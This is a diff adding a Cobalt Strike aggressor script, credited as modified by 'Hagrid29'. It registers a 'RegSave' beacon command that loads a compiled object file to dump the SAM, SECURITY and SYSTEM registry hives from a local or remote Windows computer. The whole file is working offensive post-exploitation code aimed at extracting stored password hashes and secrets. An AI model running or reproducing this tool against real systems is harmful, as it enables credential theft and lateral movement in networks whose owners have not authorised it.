@@ -1,0 +1,37 @@
+#RemoteRegSave Bof
+#modified by Hagrid29
+
+beacon_command_register("RegSave", "Dumps SAM / SECURITY / SYSTEM on remote computer", 
+	"RegSave --path [file path <optional>] --pc [remote pc <optional>]");
+
+alias RegSave {
+	$bid = $1;
+	local('$args $dir $hostname');
+	
+	$hostname = "";
+
+	$input = substr($0, 8);
+    	@args = split(' ', $input);
+
+	for($i = 0; $i < size(@args); $i++){
+		if(@args[$i] iswm "--pc"){
+		    $i = $i + 1;
+		    $hostname = @args[$i];
+		}
+		if(@args[$i] iswm "--path"){
+		    $i = $i + 1;
+		    $dir = @args[$i];
+		}
+    	}
+
+
+
+	$barch  = barch($1);
+	$handle = openf(script_resource("regdump. $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data = bof_pack($bid, "zz", $dir, $hostname);
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+
+}
